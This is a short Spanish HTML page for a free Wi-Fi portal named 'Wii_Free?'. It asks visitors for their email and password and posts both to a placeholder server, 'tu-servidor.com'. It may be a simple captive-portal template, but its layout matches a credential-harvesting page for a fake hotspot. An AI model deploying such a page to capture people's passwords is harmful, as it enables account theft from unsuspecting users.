<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Acceso a Wii_Free?</title>
  <style>
    body { font-family: Arial; text-align: center; background: #f4f4f4; }
    .banner { background: #0078D7; color: white; padding: 20px; }
    form { margin-top: 30px; }
    input[type="email"], input[type="password"] {
      padding: 10px;
      width: 250px;
      margin-bottom: 15px;
    }
    input[type="submit"] {
      padding: 10px 20px;
      background: #0078D7;
      color: white;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="banner">
    <h1>Bienvenido a Wii_Free?</h1>
    <p>Conéctate gratis y disfruta de nuestra red</p>
  </div>
  <form action="https://tu-servidor.com/registrar" method="POST">
    <label>Correo electrónico:</label><br>
    <input type="email" name="email" required placeholder="tu@email.com"><br>
    
    <label>Contraseña:</label><br>
    <input type="password" name="password" required placeholder="********"><br>
    
    <input type="submit" value="Conectar">
  </form>
  <p>Publicidad: ¡Visita nuestra web para más ofertas!</p>
</body>
</html>
